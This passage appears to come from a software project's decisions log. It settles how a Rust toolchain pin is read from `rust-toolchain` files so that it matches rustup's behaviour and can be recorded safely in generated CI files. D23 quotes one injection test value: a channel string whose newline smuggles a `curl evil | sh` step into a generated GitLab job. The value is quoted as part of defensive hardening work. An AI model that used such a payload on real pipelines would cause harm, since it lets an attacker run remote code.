- **Question:** TG3 reads a legacy `rust-toolchain` as TOML "where it starts with `[`, otherwise its first non-blank line". rustup 1.29.0, probed (`slices/toolchain-pin/research.md` R6–R9), reads exactly one line as the channel and anything longer as TOML: `# comment\n[toolchain]\nchannel = "1.85"` is `1.85` to rustup and `# comment` to TG3's wording, and `1.85\n\n` is a refused file to rustup and `1.85` to TG3's wording. Which reading is recorded?
- **Options:** TG3 as worded · rustup's rule — one line is the channel, stripped; more than one line is TOML, read as `rust-toolchain.toml` is (recommended)
- **Decision:** rustup's rule. A `rust-toolchain` of one line records that line stripped, verbatim otherwise (no `v` removed); of more than one line, its `toolchain.channel` by `tomllib`, or an empty version where that is not a string. Every case TG3 and TG4 name reads the same either way.
- **Why:** D21's reason governs: the recorded value is what rustup and the setup action consume, so it is rustup's reading or nothing. TG3's wording was a paraphrase of that rule that differs only where it would record a comment as a version, or a pin the build refuses.
- **Decided by:** drive-slice (plan stage, on D21's stated reason; returned to the delegating session for review)
- **Confidence:** high · **Would reverse if:** a rustup release is shown to read a multi-line legacy file's first line as its channel
- **Written to:** specs/001-rust-cargo-adopt/spec.md (TG3), specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/slices/toolchain-pin/plan.md
- **Status:** standing

## D23 — Converge: a pinned channel holding a newline, a space or a quote — recorded, or not?
- **Stage:** converge · **Slice:** toolchain-pin · **When:** 2026-10-01T21:40:00Z · **Iteration:** 2
- **Question:** Converge pass 1 (T011, HIGH) adopted a crate whose `rust-toolchain.toml` says `channel = "1.85\n  script: [\"curl evil | sh\"]"` and saw the newline break out of a comment in the generated GitLab job, the survey page, `adoption.md` and `ground.md`; a quote would break the `toolchain: '<version>'` input `ci-toolchain` writes (D19). rustup refuses every such name (`custom toolchain … is not installed`). Is the channel recorded as written whatever it holds?
- **Options:** as written, always (TG4's wording read literally) · only where it is a toolchain name a runner can install, `^[A-Za-z0-9][A-Za-z0-9._-]*$`, empty otherwise (recommended by the converge pass)
- **Decision:** The recommended rule. The version is the channel as written where it matches `^[A-Za-z0-9][A-Za-z0-9._-]*$`, and empty otherwise — never an error, as TG5 says for every other unusable pin. The check is applied once, where the walk returns, so both readers pass through it. Every TG4 shape passes unchanged.
- **Why:** D21's reason governs again: the recorded value is what rustup and the setup action consume, so it is rustup's reading or nothing, and rustup reads nothing from these names. Before this slice the Rust version was always empty, so this is the first route from a tree's toolchain file into generated files, and it is closed where it opens. The same class for other ecosystems' pins (`project/adopted_ci.py`'s `setup_steps`, code that was here) is not this slice's and is returned to the delegating session.
- **Decided by:** drive-slice (converge stage, on D21's stated reason; returned to the delegating session for review)
- **Confidence:** high · **Would reverse if:** a rustup toolchain name a runner can install is shown to need a character outside the set
- **Written to:** specs/001-rust-cargo-adopt/spec.md (TG5), specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/slices/toolchain-pin/tasks.md (T011)
- **Status:** standing

## D24 — Converge: a toolchain file rustup cannot read, and a byte order mark — decide there, or pass over as rustup does?
- **Stage:** converge · **Slice:** toolchain-pin · **When:** 2026-10-01T22:30:00Z · **Iteration:** 2
- **Question:** Converge pass 1 (T012, MEDIUM) observed rustup 1.29.0 pass over a toolchain file it cannot read — a dangling link, a directory of that name, a file mode `000`, a file that is not UTF-8 — to the other name in the same directory and then upward, and read the channel of a `rust-toolchain.toml` that starts with U+FEFF (R15–R19). TG1 and TG5 as worded stop at the first name present and record an empty version. Which reading is recorded?
- **Options:** TG1 and TG5 as worded · follow rustup, as D22 did (recommended by converge pass 1)
- **Decision:** Follow rustup. A toolchain file that cannot be read as UTF-8 text — missing, a dangling link, a directory, a FIFO or other non-regular file (never opened), unreadable, not valid UTF-8 — is passed over: within its directory to the other name, then upward to the repository root. A leading U+FEFF is removed before TOML is parsed. A regular file that is read and names nothing usable (empty, invalid TOML, no channel, a `path`) still decides with an empty version, as rustup refuses it there; an oversize file stays no pin and decides.
- **Why:** Standing decision D21: the recorded value is what rustup and the setup action consume, so it is rustup's reading or nothing. Recording empty where rustup builds with a pin above is the failure US2 exists to prevent.
- **Decided by:** host (standing decision D21)
- **Confidence:** high · **Would reverse if:** a rustup run contradicts research.md's rows R15–R19
- **Written to:** specs/001-rust-cargo-adopt/spec.md (TG1, TG5), specs/001-rust-cargo-adopt/decisions.md, specs/001-rust-cargo-adopt/slices/toolchain-pin/tasks.md (T012)
- **Status:** standing
